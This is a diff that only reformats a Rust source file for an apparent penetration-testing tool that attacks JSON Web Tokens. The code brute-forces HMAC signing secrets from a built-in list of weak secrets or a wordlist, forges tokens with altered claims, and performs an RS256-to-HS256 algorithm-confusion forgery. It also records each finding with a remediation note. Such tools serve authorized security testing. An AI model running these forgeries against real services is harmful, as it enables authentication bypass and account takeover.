@@ -36,8 +36,16 @@ const HS256_ALG: &str = "HS256";
 
 // Built-in short wordlist for brute-force when no --wordlist given
 const BUILTIN_SECRETS: &[&str] = &[
-    "secret", "password", "12345", "jwt_secret", "changeme",
-    "dev", "test", "admin", "key", "tok",
+    "secret",
+    "password",
+    "12345",
+    "jwt_secret",
+    "changeme",
+    "dev",
+    "test",
+    "admin",
+    "key",
+    "tok",
 ];
 
 // ── CLI ──────────────────────────────────────────────────────────────────────
@@ -107,7 +115,10 @@ struct ForgedToken {
 fn decode_jwt(token: &str) -> Result<(serde_json::Value, serde_json::Value, String)> {
     let parts: Vec<&str> = token.splitn(3, '.').collect();
     if parts.len() != 3 {
-        bail!("invalid JWT: expected 3 dot-separated parts, got {}", parts.len());
+        bail!(
+            "invalid JWT: expected 3 dot-separated parts, got {}",
+            parts.len()
+        );
     }
     let header_raw = URL_SAFE_NO_PAD
         .decode(parts[0])
@@ -115,8 +126,10 @@ fn decode_jwt(token: &str) -> Result<(serde_json::Value, serde_json::Value, Stri
     let payload_raw = URL_SAFE_NO_PAD
         .decode(parts[1])
         .context("base64url-decode JWT payload")?;
-    let header: serde_json::Value = serde_json::from_slice(&header_raw).context("parse JWT header JSON")?;
-    let payload: serde_json::Value = serde_json::from_slice(&payload_raw).context("parse JWT payload JSON")?;
+    let header: serde_json::Value =
+        serde_json::from_slice(&header_raw).context("parse JWT header JSON")?;
+    let payload: serde_json::Value =
+        serde_json::from_slice(&payload_raw).context("parse JWT payload JSON")?;
     Ok((header, payload, parts[2].to_string()))
 }
 
@@ -129,8 +142,7 @@ fn encode_part(value: &serde_json::Value) -> Result<String> {
 // Compute HMAC-SHA256 signature over "header_b64.payload_b64" with given secret bytes
 fn hmac_sha256_sign(header_b64: &str, payload_b64: &str, secret: &[u8]) -> String {
     let msg = format!("{header_b64}.{payload_b64}");
-    let mut mac = Hmac::<Sha256>::new_from_slice(secret)
-        .expect("HMAC accepts any key length");
+    let mut mac = Hmac::<Sha256>::new_from_slice(secret).expect("HMAC accepts any key length");
     mac.update(msg.as_bytes());
     let result = mac.finalize().into_bytes();
     URL_SAFE_NO_PAD.encode(result)
@@ -143,7 +155,11 @@ fn verify_secret(header_b64: &str, payload_b64: &str, sig_b64: &str, candidate: 
 }
 
 // Build a complete token string: base64url(header).base64url(payload).signature
-fn build_token(header: &serde_json::Value, payload: &serde_json::Value, secret: Option<&[u8]>) -> Result<String> {
+fn build_token(
+    header: &serde_json::Value,
+    payload: &serde_json::Value,
+    secret: Option<&[u8]>,
+) -> Result<String> {
     let h = encode_part(header)?;
     let p = encode_part(payload)?;
     let sig = match secret {
@@ -179,14 +195,15 @@ fn apply_claim_overrides(
     payload: &serde_json::Value,
     overrides: &[String],
 ) -> Result<serde_json::Value> {
-    let mut map: HashMap<String, serde_json::Value> = serde_json::from_value(payload.clone())
-        .context("payload must be a JSON object")?;
+    let mut map: HashMap<String, serde_json::Value> =
+        serde_json::from_value(payload.clone()).context("payload must be a JSON object")?;
     for kv in overrides {
-        let (k, v) = kv.split_once('=')
+        let (k, v) = kv
+            .split_once('=')
             .with_context(|| format!("--claim {kv:?} must be key=value"))?;
         // Try to parse value as JSON first; fall back to string
-        let parsed: serde_json::Value = serde_json::from_str(v)
-            .unwrap_or_else(|_| serde_json::Value::String(v.to_string()));
+        let parsed: serde_json::Value =
+            serde_json::from_str(v).unwrap_or_else(|_| serde_json::Value::String(v.to_string()));
         map.insert(k.to_string(), parsed);
     }
     Ok(serde_json::to_value(map)?)
@@ -198,8 +215,8 @@ fn alg_confusion_attack(
     payload: &serde_json::Value,
     pubkey_path: &str,
 ) -> Result<ForgedToken> {
-    let pem_bytes = fs::read(pubkey_path)
-        .with_context(|| format!("read public key PEM: {pubkey_path}"))?;
+    let pem_bytes =
+        fs::read(pubkey_path).with_context(|| format!("read public key PEM: {pubkey_path}"))?;
     let mut forged_header = header.clone();
     forged_header["alg"] = serde_json::Value::String(HS256_ALG.to_string());
     // Remove kid to reduce server-side key lookup friction
@@ -230,7 +247,10 @@ async fn main() -> Result<()> {
         Some(t) => t.clone(),
         None => {
             let mut buf = String::new();
-            io::stdin().lock().read_to_string(&mut buf).context("read token from stdin")?;
+            io::stdin()
+                .lock()
+                .read_to_string(&mut buf)
+                .context("read token from stdin")?;
             buf.trim().to_string()
         }
     };
@@ -258,10 +278,9 @@ async fn main() -> Result<()> {
     if args.brute {
         println!("\n[*] Brute-forcing secret...");
         let secret = if let Some(wl_path) = &args.wordlist {
-            let file = fs::File::open(wl_path)
-                .with_context(|| format!("open wordlist: {wl_path}"))?;
-            let lines = io::BufReader::new(file).lines()
-                .map_while(|l| l.ok());
+            let file =
+                fs::File::open(wl_path).with_context(|| format!("open wordlist: {wl_path}"))?;
+            let lines = io::BufReader::new(file).lines().map_while(|l| l.ok());
             brute_force(header_b64, payload_b64, sig_b64, lines)
         } else {
             brute_force(
@@ -291,7 +310,10 @@ async fn main() -> Result<()> {
         let token = build_token(&forged_header, &modified_payload, sign_key)?;
         println!("\n[+] Forged token (modified claims, alg={alg_label}):\n{token}");
         forged_tokens.push(ForgedToken {
-            description: format!("claim manipulation alg={alg_label} claims={}", args.claims.join(",")),
+            description: format!(
+                "claim manipulation alg={alg_label} claims={}",
+                args.claims.join(",")
+            ),
             token,
         });
     }
@@ -300,9 +322,13 @@ async fn main() -> Result<()> {
     if args.alg_confusion {
         let original_alg = header["alg"].as_str().unwrap_or("");
         if original_alg != "RS256" {
-            eprintln!("[!] --alg-confusion: header alg is {original_alg:?}, expected RS256 — continuing anyway");
+            eprintln!(
+                "[!] --alg-confusion: header alg is {original_alg:?}, expected RS256 — continuing anyway"
+            );
         }
-        let pubkey_path = args.pubkey.as_deref()
+        let pubkey_path = args
+            .pubkey
+            .as_deref()
             .context("--alg-confusion requires --pubkey <path>")?;
         let forged = alg_confusion_attack(&header, &payload, pubkey_path)?;
         println!("\n[+] Alg-confusion token:\n{}", forged.token);
@@ -339,9 +365,15 @@ async fn main() -> Result<()> {
 
     // Write finding when algorithm confusion token is forged
     if args.alg_confusion {
-        let tf = ToolFinding::new("mg-jwt", "JWT Algorithm Confusion (RS256→HS256)", FindingSeverity::High)
-            .evidence("Public key accepted as HMAC secret — forged token produced")
-            .recommendation("Verify the algorithm header server-side; reject HS256 on RS256-only endpoints");
+        let tf = ToolFinding::new(
+            "mg-jwt",
+            "JWT Algorithm Confusion (RS256→HS256)",
+            FindingSeverity::High,
+        )
+        .evidence("Public key accepted as HMAC secret — forged token produced")
+        .recommendation(
+            "Verify the algorithm header server-side; reject HS256 on RS256-only endpoints",
+        );
         let _ = write_finding(&eng, &tf);
     }
 
